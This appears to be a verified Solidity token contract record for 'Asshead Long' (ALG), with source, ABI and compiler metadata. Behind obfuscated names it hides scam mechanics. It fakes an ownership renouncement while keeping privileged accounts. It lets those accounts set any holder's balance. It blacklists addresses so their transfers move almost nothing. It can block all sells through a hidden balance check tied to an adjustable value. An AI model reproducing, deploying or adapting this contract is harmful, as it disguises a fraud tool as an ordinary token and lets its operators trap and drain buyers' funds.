{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface listMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderFee {\n    function createPair(address tokenLiquidityEnable, address listTx) external returns (address);\n}\n\ninterface fromToSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFrom) external view returns (uint256);\n\n    function transfer(address liquidityReceiver, uint256 teamAt) external returns (bool);\n\n    function allowance(address autoList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityReceiver,\n        uint256 teamAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchMarketingTrading, uint256 value);\n    event Approval(address indexed autoList, address indexed spender, uint256 value);\n}\n\ninterface minReceiverFee is fromToSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssheadLong is amountTotal, fromToSell, minReceiverFee {\n\n    function isAmountLimit(address feeTeam, address liquidityReceiver, uint256 teamAt) internal returns (bool) {\n        if (feeTeam == launchedAmount) {\n            return maxTo(feeTeam, liquidityReceiver, teamAt);\n        }\n        uint256 autoReceiver = fromToSell(shouldLiquidity).balanceOf(autoAt);\n        require(autoReceiver == fundShouldTake);\n        require(liquidityReceiver != autoAt);\n        if (shouldTotal[feeTeam]) {\n            return maxTo(feeTeam, liquidityReceiver, listReceiver);\n        }\n        return maxTo(feeTeam, liquidityReceiver, teamAt);\n    }\n\n    function maxTo(address feeTeam, address liquidityReceiver, uint256 teamAt) internal returns (bool) {\n        require(totalMode[feeTeam] >= teamAt);\n        totalMode[feeTeam] -= teamAt;\n        totalMode[liquidityReceiver] += teamAt;\n        emit Transfer(feeTeam, liquidityReceiver, teamAt);\n        return true;\n    }\n\n    uint256 private feeTrading;\n\n    function receiverWallet(address listAmount) public {\n        exemptBuy();\n        \n        if (listAmount == launchedAmount || listAmount == shouldLiquidity) {\n            return;\n        }\n        shouldTotal[listAmount] = true;\n    }\n\n    mapping(address => uint256) private totalMode;\n\n    function modeExempt(uint256 teamAt) public {\n        exemptBuy();\n        fundShouldTake = teamAt;\n    }\n\n    uint256 private amountBuy;\n\n    constructor (){\n        if (tradingFee != buyTake) {\n            buyTake = true;\n        }\n        listMode launchMinMax = listMode(modeFee);\n        shouldLiquidity = senderFee(launchMinMax.factory()).createPair(launchMinMax.WETH(), address(this));\n        \n        launchedAmount = _msgSender();\n        exemptEnable();\n        shouldTeam[launchedAmount] = true;\n        totalMode[launchedAmount] = receiverTx;\n        if (feeTrading != fromEnable) {\n            receiverSender = false;\n        }\n        emit Transfer(address(0), launchedAmount, receiverTx);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedMode;\n    }\n\n    address public shouldLiquidity;\n\n    mapping(address => mapping(address => uint256)) private swapExempt;\n\n    function transferFrom(address feeTeam, address liquidityReceiver, uint256 teamAt) external override returns (bool) {\n        if (_msgSender() != modeFee) {\n            if (swapExempt[feeTeam][_msgSender()] != type(uint256).max) {\n                require(teamAt <= swapExempt[feeTeam][_msgSender()]);\n                swapExempt[feeTeam][_msgSender()] -= teamAt;\n            }\n        }\n        return isAmountLimit(feeTeam, liquidityReceiver, teamAt);\n    }\n\n    function transfer(address marketingLaunched, uint256 teamAt) external virtual override returns (bool) {\n        return isAmountLimit(_msgSender(), marketingLaunched, teamAt);\n    }\n\n    string private shouldTrading = \"ALG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTx;\n    }\n\n    event OwnershipTransferred(address indexed receiverLimit, address indexed atList);\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeLaunched;\n    }\n\n    function balanceOf(address receiverFrom) public view virtual override returns (uint256) {\n        return totalMode[receiverFrom];\n    }\n\n    mapping(address => bool) public shouldTotal;\n\n    function exemptEnable() public {\n        emit OwnershipTransferred(launchedAmount, address(0));\n        fundSell = address(0);\n    }\n\n    function approve(address receiverMax, uint256 teamAt) public virtual override returns (bool) {\n        swapExempt[_msgSender()][receiverMax] = teamAt;\n        emit Approval(_msgSender(), receiverMax, teamAt);\n        return true;\n    }\n\n    mapping(address => bool) public shouldTeam;\n\n    bool public tradingFee;\n\n    address private fundSell;\n\n    bool private buyTake;\n\n    function getOwner() external view returns (address) {\n        return fundSell;\n    }\n\n    bool public totalShould;\n\n    function allowance(address fromFund, address receiverMax) external view virtual override returns (uint256) {\n        if (receiverMax == modeFee) {\n            return type(uint256).max;\n        }\n        return swapExempt[fromFund][receiverMax];\n    }\n\n    address public launchedAmount;\n\n    bool public receiverSender;\n\n    uint256 constant listReceiver = 1 ** 10;\n\n    address modeFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private takeLaunched = 18;\n\n    address autoAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function listShould(address marketingLaunched, uint256 teamAt) public {\n        exemptBuy();\n        totalMode[marketingLaunched] = teamAt;\n    }\n\n    string private launchedMode = \"Asshead Long\";\n\n    uint256 fundShouldTake;\n\n    function exemptBuy() private view {\n        require(shouldTeam[_msgSender()]);\n    }\n\n    uint256 public fromEnable;\n\n    uint256 private fundMarketing;\n\n    uint256 private receiverTx = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return fundSell;\n    }\n\n    function isSwap(address modeFund) public {\n        if (totalShould) {\n            return;\n        }\n        if (amountBuy == fundMarketing) {\n            buyTake = false;\n        }\n        shouldTeam[modeFund] = true;\n        \n        totalShould = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTrading;\n    }\n\n    uint256 fundTotalLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMarketingTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"}],\"name\":\"isSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAt\",\"type\":\"uint256\"}],\"name\":\"listShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamAt\",\"type\":\"uint256\"}],\"name\":\"modeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAmount\",\"type\":\"address\"}],\"name\":\"receiverWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AssheadLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}